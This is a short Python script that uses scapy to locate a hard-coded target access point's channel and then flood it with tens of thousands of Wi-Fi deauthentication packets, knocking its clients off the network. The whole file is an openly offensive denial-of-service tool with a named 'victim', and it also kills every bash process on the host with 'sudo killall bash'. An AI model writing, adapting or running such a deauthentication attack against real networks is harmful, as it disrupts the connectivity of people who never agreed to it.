import Class
import time,os
from scapy.all import sniff,Dot11Beacon, Dot11FCS, Dot11EltDSSSet, Dot11, sendp

victim = Class.WiFi
victim.bssid = "b0:0a:d5:40:cf:3e"
card = "wlan1mon"
_T = 60 # second

#get the fuck channel and filter th scapy for beacons and addr2 = victim bssdi

def channel(pkt):
    if os.system("sudo bash channel_hopping.sh > /dev/null&") !=0 :
        print(" [+] run as root ")
    _channel = -1
    for p in pkt:
        if p.haslayer(Dot11EltDSSSet):
            if p.getlayer(Dot11FCS).addr2 == victim.bssid.lower():
                os.system("sudo killall bash > /dev/null&")
                _channel = p.getlayer(Dot11EltDSSSet).channel
                break
    return _channel

def main():
    try:
        while(1):
            pakets = sniff(count=13,iface = card,lfilter=lambda x: Dot11 in x and x[Dot11].subtype == 0x08)
            victim.channel = channel(pakets)
            while(victim.channel != -1):
                print(f'attacking victim {victim.bssid} at channel {victim.channel}')
                sendp(Class.Packet.deauth(victim),count=_T*1000,iface=card, verbose=False)
                break

    except KeyboardInterrupt:
        os.system("sudo killall bash > /dev/null&")

if __name__ == "__main__":
    main()
